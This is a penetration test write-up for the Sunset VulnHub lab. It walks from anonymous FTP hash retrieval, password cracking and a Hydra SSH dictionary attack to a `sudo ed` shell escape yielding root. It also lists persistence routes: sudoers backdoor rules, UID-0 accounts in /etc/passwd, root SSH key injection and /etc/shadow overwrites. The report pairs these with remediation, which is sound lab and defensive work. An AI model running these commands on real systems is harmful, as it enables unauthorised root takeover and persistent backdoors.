> Public edition of my original lab notes. Structure and explanations are retained. Passwords, flags and device identifiers are omitted; addresses use documentation examples. Screenshots remain in the private source notes, so references to captures describe that record rather than images reproduced here. Technical corrections are applied where needed.

**Penetration Test Report & Technical Walkthrough**

> Outcome · Root access confirmed
> An anonymously accessible FTP backup exposed password hashes. Offline cracking recovered the `sunset` password, and an unsafe sudo permission allowed the account to start a root shell through the `ed` editor. The final screenshot confirms `whoami` returning `root`.

| Target | Entry point | Privilege escalation | Final access |
| :--- | :--- | :--- | :--- |
| `192.0.2.10` | Anonymous FTP → credential backup | `(root) NOPASSWD: /usr/bin/ed` | **root** |

---


## Summary

The recorded assessment of the Sunset lab machine demonstrates a complete compromise through three connected weaknesses: disclosure of credential material over anonymous FTP, a dictionary-recoverable password, and excessive sudo privileges.

Network enumeration identified FTP on TCP port `21` and SSH on TCP port `22`. FTP accepted the username `anonymous` and exposed a file named `backup`. The original notes record downloading this file and inspecting its password hashes. John the Ripper recovered `[password omitted]` for `sunset`. The notes record successful access with these credentials, and subsequent screenshots show an authenticated shell as `sunset`.

Local enumeration revealed permission to execute `/usr/bin/ed` as root without a password. Starting that editor with sudo and invoking its shell escape, `!sh`, produced a shell where `whoami` returned `root`.

**Impact:** the demonstrated chain grants administrative control of the target. Root access would permit reading or changing protected files, modifying accounts and services, and disrupting the system. Those follow-on actions were not demonstrated in the supplied evidence.


## Scope and environment

| Item | Recorded detail |
| :--- | :--- |
| Machine / platform | Sunset / VulnHub lab |
| Virtualization | Oracle VirtualBox |
| Target OS | Debian GNU/Linux 10, visible at the console |
| Target address | `192.0.2.10` |
| Target MAC | `[device identifier omitted]` |
| Attacking system | Kali Linux |
| Attacker address | `192.0.2.11`, visible in the ARP scan |
| Attack surface | Local-network discovery, FTP, SSH, and local sudo permissions |
| Tools | Netdiscover, arp-scan, Nmap, FTP client, John the Ripper, sudo, ed |

Other devices appear in discovery screenshots; this report concerns only Sunset. Screenshot clocks have different displayed time contexts and are not treated as a synchronized assessment timeline.


## Attack path


:::flow Connections at a glance
- Discover target on local network → Enumerate FTP and SSH
- Enumerate FTP and SSH → Log in to FTP anonymously
- Log in to FTP anonymously → Retrieve credential backup
- Retrieve credential backup → Crack sunset password offline
- Crack sunset password offline → Authenticate as sunset
- Authenticate as sunset → Discover root sudo permission for ed
- Discover root sudo permission for ed → Run ed and invoke shell escape
- Run ed and invoke shell escape → Confirm root with whoami
:::


**Chain:** discovery → anonymous FTP → credential exposure → offline cracking → user access → sudo editor escape → root.

## Technical proof of concept

### 01 · Discover the target

**Objective:** identify the Sunset VM on the local network.

The notes list Netdiscover and arp-scan. Netdiscover shows `192.0.2.10` with MAC address `[device identifier omitted]`; the successful ARP scan independently shows the same pair.

```bash
sudo arp-scan -l
```

The `-l` option selects the local network. Relevant output:

```text
192.0.2.10    [device identifier omitted]    PCS Systemtechnik GmbH
```

The vendor label is a discovery clue, not sufficient identification by itself. Nmap later labels this same MAC as an Oracle VirtualBox virtual NIC.


**Result:** use `192.0.2.10` for service enumeration.

### 02 · Enumerate exposed services

**Objective:** identify reachable TCP services and their reported versions.

```bash
nmap -Pn -sV -p- 192.0.2.10
```

| Option | Purpose |
| :--- | :--- |
| `-Pn` | Skip host discovery and proceed with scanning |
| `-sV` | Probe open ports to identify services and versions |
| `-p-` | Scan TCP ports 1–65535 |

The captured scan reports:

| Port | State | Service | Reported version |
| :--- | :--- | :--- | :--- |
| `21/tcp` | Open | FTP | pyftpdlib 1.5.5 |
| `22/tcp` | Open | SSH | OpenSSH 7.9p1 Debian 10, protocol 2.0 |

The remaining `65,533` TCP ports were reported closed. This scan does not establish UDP exposure. The banners are recorded observations; the demonstrated attack did not rely on a software-version exploit.


**Decision:** investigate FTP for accessible files, then determine whether recovered credentials provide account access.

### 03 · Access FTP and retrieve the backup

**Objective:** determine whether anonymous users can access sensitive content.

```bash
ftp 192.0.2.10
```

Enter `anonymous` as the username. The screenshot does not reveal the password entered at the FTP prompt, but confirms successful login:

```text
Name (192.0.2.10:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
```

List the directory:

```text
ftp> ls -la
```

The listing shows:

```text
-rw-r--r--  1 root root  1062 Jul 29 2019 backup
```

The filename is **`backup`**; `2019` is the year in the timestamp. The listed file size is 1,062 bytes.


The notes record downloading the file and inspecting it. A cleaned reproduction sequence is:

```text
ftp> get backup
ftp> bye
```

```bash
cat backup
```


**Result:** password hashes were available for offline attack. These are password **hashes**, rather than encrypted passwords to be decrypted.

### 04 · Recover the sunset password

**Objective:** test dictionary candidates against an exposed password hash.

The recorded commands use a local `rockyou.txt` wordlist:

```bash
john --format=sha512crypt --wordlist=rockyou.txt backup
john --show backup
```

For reproduction, `backup` and `rockyou.txt` must exist at the specified paths. John identifies the selected format as `sha512crypt`, with the `$6$` identifier and an iteration count of `5000` in this run.

Relevant recovery output:

```text
[password omitted]          (sunset)
```

The display command confirms:

```text
sunset:[password omitted]

1 password hash cracked, 3 left
```


| Field | Value |
| :--- | :--- |
| Username | `sunset` |
| Password | `[password omitted]` |
| Selected hash format | SHA-512 crypt (`sha512crypt`) |
| Recovery method | Offline dictionary attack with `rockyou.txt` |

**Why it matters:** copied hashes allow guesses to be tested locally without login attempts to the target. This demonstrates a weak password, not a cryptographic break of SHA-512 crypt. The output reports three hashes left, so it does not support claiming that every password was recovered.

### 05 · Obtain user access and the user flag

**Objective:** access the target account with the recovered credential.

The notes record successful machine access using `sunset` / `[password omitted]`. Since SSH was available, the reproduction command for remote access is:

```bash
ssh sunset@192.0.2.10
```

Enter `[password omitted]` at the password prompt. The screenshots begin after authentication and show a `sunset@sunset` shell. They confirm account access but do not show the SSH login exchange; the connection command above is reconstructed.

The captured local checks include:

```bash
whoami
ls -la
cat user.txt
```

Observed account:

```text
sunset
```

Observed user flag:

```text
[flag omitted]
```


**Result:** user-level access and the user flag are confirmed.

### 05a · SSH password guessing


**Objective:** test candidate passwords directly against SSH instead of recovering the password from the downloaded hash. Although commonly called “SSH brute forcing,” using a wordlist is specifically a dictionary attack.


```bash
hydra -l sunset -P /home/kali/rockyou.txt -t 1 -f ssh://192.0.2.12
```

| Option | Purpose |
| :--- | :--- |
| `-l sunset` | Test the single known account |
| `-P /home/kali/rockyou.txt` | Read candidate passwords from the specified file; adjust the path to the local wordlist |
| `-t 1` | Use one task at a time |
| `-f` | Stop after finding a valid login for the target |
| `ssh://192.0.2.12` | Select the target SSH service |


### 06 · Enumerate sudo permissions

**Objective:** identify commands the account can execute with elevated privileges.

```bash
sudo -l
```

The evidence shows:

```text
User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

| Component | Meaning |
| :--- | :--- |
| `(root)` | The command may run as root |
| `NOPASSWD` | Sudo does not require a password for this permitted command |
| `/usr/bin/ed` | The permitted executable is the `ed` text editor |

**Why this is dangerous:** `ed` can execute shell commands. Granting root execution to an editor with this capability can turn a seemingly limited permission into an interactive root shell.

The screenshot also shows `env_reset` and `secure_path` in the sudo defaults. In the captured attempt, these settings did not prevent the permitted editor from invoking a shell.

### 07 · Escape from ed and confirm root

**Objective:** demonstrate the impact of the sudo permission.

Start the permitted editor:

```bash
sudo ed
```

At the editor input, enter:

```text
!sh
```

In the resulting shell, check the effective username:

```bash
whoami
```

Observed output:

```text
root
```


The original capture includes an initial `!echo "hello"` check, an editor `?` response, and a mistyped `whoamii` command. The cleaned sequence retains the successful actions; the image preserves the actual session.

> Proof of compromise
> `whoami` returns `root` after the editor shell escape. Root execution is confirmed by the screenshot. The later session summary also reports root-flag retrieval; its value and evidence status are recorded below.

## Supplementary session and alternative-route testing

### Follow-up session · Target address and access

The later supplied transcript connects to **`192.0.2.12`** as `sunset` using the same recovered password, `[password omitted]`. This is the target address recorded for that session; the original screenshots use `192.0.2.10`. The visible SSH banner identifies hostname `sunset` and reports:

```text
Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
```

The session used Expect to answer SSH and SCP password prompts. The first SCP attempt failed because it could not obtain a password through `ssh-askpass`; the subsequent attempt used Expect. This was an authentication-automation issue, not an additional vulnerability.

### Root flag · Reported in the follow-up summary

The supplied summary reports successful escalation through the same sudo editor permission:

```text
sudo /usr/bin/ed
!/bin/sh
```

It reports `uid=0(root) gid=0(root)` and retrieval of the root flag with:

```bash
cat /root/flag.txt
```

Reported value omitted in this public edition:

```text
[flag omitted]
```

> Source distinction
> The original screenshot directly confirms root access. The root-flag value above comes from the later narrative summary; the pasted material does not expose its raw terminal output. It is recorded as reported, not independently verified.





### Alternative escalation attempt · PwnKit

The follow-up summary reports these enumeration results:

| Check | Reported result |
| :--- | :--- |
| `pkexec --version` | `0.105` |
| Installed polkit package | `0.105-25` |
| `/usr/bin/pkexec` permissions | SUID root (`-rwsr-xr-x`) |
| Target compiler availability | No `gcc`, `cc`, or `make` found |
| Local compilation | A test program was compiled on Kali with `gcc -static` |
| Target execution | Segmentation fault reported; no root shell obtained |

These package and permission results are recorded in the session summary; their underlying command outputs are collapsed in the pasted transcript.

**Recorded outcome: unsuccessful attempt, not a verified alternative route.** The first test program compiled locally, but the reported target crash does not establish CVE-2021-4034 or prove a particular memory-corruption mechanism. The code comments and accompanying explanation are not evidence that the intended vulnerability was triggered.

A second source listing was proposed, but no successful build, execution, or elevated identity is shown. It also attempts to invoke `gcc` on the target despite the reported absence of a compiler. Neither listing is retained as a working PoC.

| Route | Evidence-supported status |
| :--- | :--- |
| Anonymous FTP → recovered password → user access → `sudo ed` | Root access confirmed in the original screenshots; repeated success reported in the follow-up summary |
| PwnKit / `pkexec`                                            | Attempt reported; no successful privilege escalation demonstrated                                     |

The reported segmentation fault does not establish which vulnerability was triggered. The available record does not support a root-cause explanation or a working alternative exploit.

### Alternative privilege escalation methods via privileged file operations

In the primary attack path, root execution was achieved immediately by invoking the shell escape `!sh` inside `sudo ed`. However, because `sudo /usr/bin/ed` executes with full root permissions (`NOPASSWD`), it functions as an unrestricted arbitrary file reader and writer. The following are conceptual consequences of unrestricted root-level file writes, not additional demonstrated successes in this session. They can damage account or sudo configuration; they are not exercises for a normal workstation.

#### Route A · Modifying the sudoers configuration

Instead of spawning a shell directly from the editor, an attacker can modify the sudoers file to grant the current user account full, unrestricted administrative permissions.

```bash
sudo ed /etc/sudoers
```

Within the `ed` editor interface, append a rule granting `sunset` full sudo permissions without requiring a password:

```text
$a
sunset ALL=(ALL:ALL) NOPASSWD: ALL
.
w
q
```

*Command breakdown:*
- `$` navigates to the final line of `/etc/sudoers`.
- `a` enters append mode.
- `sunset ALL=(ALL:ALL) NOPASSWD: ALL` grants complete administrative execution rights.
- `.` exits append mode.
- `w` writes changes to disk.
- `q` exits the editor.

Modern Debian distributions also support modular drop-in configurations inside `/etc/sudoers.d/`. A drop-in avoids editing the main file, but still requires correct ownership, permissions and syntax validation; an invalid rule can break sudo access:

```bash
sudo ed /etc/sudoers.d/sunset
```

```text
a
sunset ALL=(ALL:ALL) NOPASSWD: ALL
.
w
q
```

Once written, full root access can be invoked cleanly:

```bash
sudo su -
```

#### Route B · Changing user UID to 0 in /etc/passwd

In Linux systems, superuser authority is defined strictly by the User ID (UID 0), not by the username string `root`. The `/etc/passwd` file defines account attributes in the format `username:password:UID:GID:gecos:home:shell`.

The existing entry for `sunset` is:

```text
sunset:x:1000:1000:sunset,,,:/home/sunset:/bin/bash
```

Using `ed` to modify the UID and GID fields to `0:0` turns `sunset` into a root-equivalent account:

```bash
sudo ed /etc/passwd
```

```text
/sunset:/
s/1000:1000/0:0/
w
q
```

*Command breakdown:*
- `/sunset:/` locates the line containing the `sunset` user entry.
- `s/1000:1000/0:0/` substitutes UID 1000 and GID 1000 with 0 and 0.
- `w` writes the modified file.
- `q` exits.

Upon logging in again through SSH or running `su - sunset`, the operating system assigns UID 0:

```bash
id
```

Illustrative identity after the proposed change (not recorded as a separate successful route):

```text
uid=0(sunset) gid=0(root) groups=0(root)
```

The user now possesses full administrative privileges without changing accounts.

#### Route C · Appending a secondary UID 0 account to /etc/passwd

Rather than modifying an existing account, an operator can append a new account with UID 0 directly into `/etc/passwd`.

A password hash can be generated on Kali or on the command line using `openssl`:

```bash
openssl passwd -1 -salt evil password123
```

Illustrative hash placeholder (generate a real lab-only value locally):

```text
$1$example$REPLACE_WITH_GENERATED_HASH
```

Using `ed` to append the account `toor`:

```bash
sudo ed /etc/passwd
```

```text
$a
toor:$1$example$REPLACE_WITH_GENERATED_HASH:0:0:root:/root:/bin/bash
.
w
q
```

Elevate to root using the new account:

```bash
su - toor
```

In a permissive lab configuration, the account may authenticate with the password used to generate its hash. PAM policy and hash support affect this; it was not a demonstrated route in this session.

#### Route D · Injecting authorized SSH keys for root

OpenSSH on Debian commonly permits root authentication using SSH keys (`PermitRootLogin prohibit-password`). An operator can place their own public key directly into `/root/.ssh/authorized_keys` using `ed`.

On the attacking system, inspect the public key:

```bash
cat ~/.ssh/id_rsa.pub
```

On the target, write the key using `sudo ed`:

```bash
sudo ed /root/.ssh/authorized_keys
```

```text
$a
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... kali@kali
.
w
q
```

From Kali, connect directly as root without a password prompt:

```bash
ssh -i ~/.ssh/id_rsa root@192.0.2.10
```

Whether this establishes an SSH session depends on effective root-login policy, key acceptance, directory permissions and the account state; this is a conceptual route, not a recorded success.

#### Route E · Overwriting the root password hash in /etc/shadow

The `/etc/shadow` file stores password hashes, not encrypted passwords; normal access is restricted by system permissions. Using `ed`, the existing password hash for `root` can be replaced with a known hash (for example, the hash of `[password omitted]` recovered earlier from `backup`):

```bash
sudo ed /etc/shadow
```

Locate the `root` entry and replace its password field:

```text
1s/^root:[^:]*:/root:$6$salt$hash...:/
w
q
```

Switch to root using the known password:

```bash
su - root
```

#### Route F · Scheduled task evaluation (inapplicable on Sunset)

On standard Unix-like systems, arbitrary file write permissions can be leveraged against `/etc/crontab` or `/etc/cron.d/` to execute scheduled commands under root authority (for example, setting SUID permissions on `/bin/bash`).

During enumeration of Sunset, however, the follow-up notes report that **no crontab or cron service is installed or active** on the target. As a result, cron-based escalation cannot be triggered here. This vector is noted for technical completeness in file-write escalation assessments, but was ruled out on this specific target.

### Broader Linux privilege escalation vectors for enumeration

In addition to leveraging arbitrary file write via `ed`, a complete local security audit of a Linux host evaluates several standard privilege escalation vectors:

1. **SUID and SGID Executables:**
   Auditing setuid binaries identifies programs that execute with their file owner’s effective identity. Root-owned entries need particular attention:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   Binaries listed in GTFOBins (such as misconfigured system utilities) can often be abused to break out into an elevated shell.

2. **Linux Capabilities:**
   Modern Linux distributions implement POSIX capabilities to grant specific root privileges to binaries without assigning full SUID root:
   ```bash
   /sbin/getcap -r / 2>/dev/null
   ```
   Capabilities like `cap_setuid+ep` on scripting engines or utilities provide direct paths to root.

3. **Kernel Vulnerabilities:**
   Sunset runs Debian 10 with kernel `4.19.0-5-amd64` (built July 2019). While local compilers (`gcc`, `make`) are not installed on the machine, a kernel version string alone does not establish exploitability. Distribution patches, configuration and architecture must be checked against an advisory; no kernel exploit was demonstrated here.

4. **Service Configurations (Cron Absent):**
   Scheduled task abuse via `/etc/cron*` is not possible on Sunset because the host lacks a running cron daemon. Auditing on this host focuses instead on systemd unit files in `/etc/systemd/system/` or standalone background processes.

5. **Internal Network and IPC Services:**
   Enumerating local-only listening services (`ss -tulpn` or `netstat -tulpn`) can reveal administrative services or databases bound strictly to `127.0.0.1` that may be vulnerable to unauthenticated local command execution.

### Comparison of privilege escalation methods

| Vector | Target / Mechanism | Requirements | Resulting Access | Reliability |
| :--- | :--- | :--- | :--- | :--- |
| **Editor Shell Escape** | `sudo ed` → `!sh` | Sudo rule for `ed` | Immediate root shell | High (Primary method) |
| **Sudoers Modification** | `/etc/sudoers` or `/etc/sudoers.d/` | Privileged file write | Permanent passwordless sudo | Not tested in this session |
| **User UID Reassignment** | `/etc/passwd` (`sunset` → UID 0) | Privileged file write | Native UID 0 session for user | Not tested in this session |
| **Secondary Root Account** | `/etc/passwd` (`toor` UID 0) | Privileged file write | Independent root user | Not tested in this session |
| **SSH Key Authorization** | `/root/.ssh/authorized_keys` | Privileged file write & SSH | Direct remote root login | Not tested in this session |
| **Shadow Hash Replacement** | `/etc/shadow` | Privileged file write | Known password for `su root` | Not tested in this session |
| **Cron Task Injection** | `/etc/crontab` | Privileged file write & active cron | Asynchronous SUID shell | Inapplicable (no cron service on Sunset) |
| **SUID / Polkit Exploits** | `pkexec` / memory corruption | SUID binary & valid exploit | Root shell execution | Low (Unsuccessful test) |

## Security findings

| ID     | Finding                                        | Severity | Evidence              | Demonstrated effect                                |
| :----- | :--------------------------------------------- | :------- | :-------------------- | :------------------------------------------------- |
| SUN-01 | Sensitive backup exposed through anonymous FTP | High     | Private source captures and notes | Credential material available for offline cracking |
| SUN-02 | Dictionary-recoverable account password        | High     | Private source captures | Password recovered; account access followed        |
| SUN-03 | Root-capable editor permitted by sudo          | Critical | Private source captures | User account obtained a root shell                 |

### SUN-01 · Sensitive backup exposed through anonymous FTP

**Affected component:** FTP on `192.0.2.10:21`, file `backup`.

**Condition:** an anonymous session could list the backup. The notes record retrieving it, and John subsequently processed credential material from a local file of that name.

**Prerequisite:** network access to FTP; no named target account was needed for the recorded login.

**Impact:** exposed hashes enable offline guessing and provide account information for later access attempts. Anonymous FTP alone is not necessarily a vulnerability; exposing credential material through it is the demonstrated security failure.

**Correction:** remove credential backups from FTP-served directories, restrict access to backups, and disable anonymous access where unnecessary. Rotate credentials associated with exposed hashes. Review the backup workflow so the file cannot simply reappear.

### SUN-02 · Dictionary-recoverable account password

**Affected account:** `sunset`.

**Condition:** John recovered `[password omitted]` with the supplied wordlist. Later screenshots confirm an authenticated `sunset` session.

**Prerequisite:** possession of the exposed hash for the demonstrated offline attack.

**Impact:** the recovered credential supports account impersonation and supplies the local foothold needed to exploit sudo. Password reuse on other machines or services is not established.

**Correction:** replace the compromised password with a long, unique password and reset other credentials affected by the backup exposure. Where practical, use SSH keys and disable SSH password authentication after verifying key access. Login rate limits can help with online guessing but cannot prevent attacks against a copied hash.

### SUN-03 · Root-capable editor permitted by sudo

**Affected configuration:** authorization for `sunset` to execute `/usr/bin/ed` as root.

**Condition:** `(root) NOPASSWD: /usr/bin/ed` permits an interactive editor with shell execution. The recorded `!sh` escape yielded root.

**Prerequisite:** control of the `sunset` account.

**Impact:** the account can cross the privilege boundary to administrative access. Critical severity reflects its role in the demonstrated compromise chain; this individual finding requires an existing user foothold.

**Correction:** remove the rule unless a justified administrative need exists. If a specific privileged operation is required, permit only a narrowly constrained operation with validated inputs, avoiding interactive editors and general-purpose interpreters. Removing `NOPASSWD` alone is insufficient here because the account password was recovered.

## Remediation and verification

These are proposed corrections and retest criteria, not completed changes.

| Priority | Corrective action | Verification criterion |
| :--- | :--- | :--- |
| Immediate | Remove root `ed` authorization | `sudo -l` no longer lists the rule; `sudo ed` is denied |
| Immediate | Remove exposed credential backups | Anonymous clients cannot retrieve `backup` or equivalent files |
| Immediate | Rotate exposed credentials | The old password no longer authenticates; affected accounts have been reviewed |
| High | Disable unnecessary anonymous FTP | Anonymous login is rejected |
| High | Review backup storage and permissions | New backups stay outside served directories and have restricted access |
| High | Harden SSH authentication | Intended users retain verified access; disabled password authentication rejects password-only login |
| High | Review other sudo permissions | No unnecessary editors, shells, or interpreters remain executable as root |

**Retest order:** verify that credential exposure is closed, confirm the compromised password is invalid, then check that an ordinary user cannot invoke a privileged editor or shell. Validate each break in the chain independently.


## Lessons and outcome

A small network attack surface still allowed a complete compromise. FTP exposed credential material, a weak password converted that exposure into user access, and a permissive sudo rule converted user access into root execution.

The decisive failures were **where secrets were stored**, **how resistant the password was to guessing**, and **what the user could run as root**. Correcting any one of these stages interrupts the recorded path; correcting all three addresses the chain comprehensively.

> Recorded outcome
> **User access:** confirmed as `sunset`
>
> **User flag:** `[flag omitted]`
>
> **Privilege escalation:** `sudo ed` → `!sh`
>
> **Root proof:** `whoami` → `root`
>
> **Root flag (reported in follow-up summary):** `[flag omitted]`
>
> **Alternative route:** PwnKit attempt unsuccessful; no additional route verified

## References and editorial context

- [Qualys PwnKit advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) — the documented CVE mechanism must not be inferred from an unexplained crash.
- [Linux permissions reference](https://man7.org/linux/man-pages/man1/chmod.1.html).

The primary FTP → account access → sudo editor chain is retained from the original report. The alternative file-write examples are conceptual and configuration-dependent; only the editor shell escape is recorded as successful. The unsupported explanation claiming a segmentation fault proved PwnKit was removed.
